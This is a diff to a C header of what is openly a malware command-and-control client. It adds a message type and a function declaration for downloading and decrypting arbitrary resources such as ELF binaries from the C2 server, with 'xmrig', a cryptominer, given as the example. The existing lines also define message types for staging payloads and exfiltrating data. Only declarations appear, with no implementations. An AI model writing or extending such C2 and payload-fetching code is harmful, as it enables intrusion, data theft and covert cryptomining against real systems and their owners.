@@ -37,6 +37,7 @@ typedef enum {
   C2_MSG_STAGE_DATA = 0x08,   /* Next stage data                       */
   C2_MSG_EXFIL = 0x09,        /* Data exfiltration                     */
   C2_MSG_HEARTBEAT = 0x0A,    /* Lightweight keepalive                 */
+  C2_MSG_RESOURCE_REQ = 0x0B, /* Request a generic resource (ELF, etc) */
 } aegis_c2_msg_type_t;
 
 /* ── C2 Message Envelope ─────────────────────────────────────────────────── */
@@ -125,6 +126,20 @@ aegis_result_t aegis_c2_fetch_stage(aegis_c2_ctx_t *ctx, uint8_t **stage_out,
 aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
                                       uint8_t **payload_out,
                                       size_t *payload_len);
+
+/*
+ * aegis_c2_fetch_resource — Request and receive a generic resource (e.g. ELF).
+ * The resource is downloaded and decrypted into memory.
+ *
+ * @ctx:          C2 client context.
+ * @resource_id:  Identifier string for the resource (e.g., "xmrig").
+ * @res_out:      Output: pointer to buffer containing decrypted resource.
+ * @res_len:      Output: length of the resource.
+ */
+aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
+                                       const char *resource_id,
+                                       uint8_t **res_out,
+                                       size_t *res_len);
 
 /* ── Channel Management ──────────────────────────────────────────────────── */
 
